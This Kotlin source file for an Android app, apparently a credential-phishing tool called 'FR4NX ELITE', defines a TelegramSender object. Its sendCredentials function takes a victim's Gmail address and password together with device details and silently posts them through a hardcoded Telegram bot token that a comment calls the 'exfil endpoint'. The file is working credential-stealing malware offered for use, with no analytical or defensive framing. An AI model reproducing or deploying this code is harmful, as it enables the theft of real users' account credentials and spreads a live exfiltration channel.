package com.fr4nx.elite

import android.content.Context
import android.os.Build
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object TelegramSender {

    // Bot token — exfil endpoint
    private const val BOT_TOKEN = "9032466437:AAEF8ifxJvGM5ghUFCfEcNPbB5GcHiXw-UY"
    private const val API = "https://api.telegram.org/bot"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    @Volatile
    private var cachedChatId: String? = null

    fun sendCredentials(ctx: Context, email: String, password: String) {
        val chatId = resolveChatId() ?: return
        val device = "${Build.MANUFACTURER} ${Build.MODEL} · Android ${Build.VERSION.RELEASE}"
        val message = buildString {
            appendLine("🔐 FR4NX ELITE — CAPTURE")
            appendLine("📧 Gmail: $email")
            appendLine("🔑 Password: $password")
            appendLine("📱 Device: $device")
            appendLine("🆔 App: ${ctx.packageName}")
        }
        sendMessage(chatId, message)
    }

    private fun resolveChatId(): String? {
        cachedChatId?.let { return it }
        val url = "${API}${BOT_TOKEN}/getUpdates?limit=1&offset=-1"
        return try {
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return null
                val updates = JSONObject(body).optJSONArray("result") ?: return null
                if (updates.length() == 0) return null
                val last = updates.getJSONObject(0)
                val chat = (last.optJSONObject("message")?.optJSONObject("chat")
                    ?: last.optJSONObject("channel_post")?.optJSONObject("chat")
                    ?: last.optJSONObject("edited_message")?.optJSONObject("chat"))
                    ?: return null
                val id = chat.optLong("id", 0L)
                if (id == 0L) null else id.toString().also { cachedChatId = it }
            }
        } catch (_: Throwable) {
            null
        }
    }

    private fun sendMessage(chatId: String, text: String) {
        try {
            val payload = JSONObject()
                .put("chat_id", chatId)
                .put("text", text)
                .put("disable_web_page_preview", true)
                .toString()
            val req = Request.Builder()
                .url("${API}${BOT_TOKEN}/sendMessage")
                .post(payload.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().close()
        } catch (_: Throwable) {
            // silent
        }
    }
}
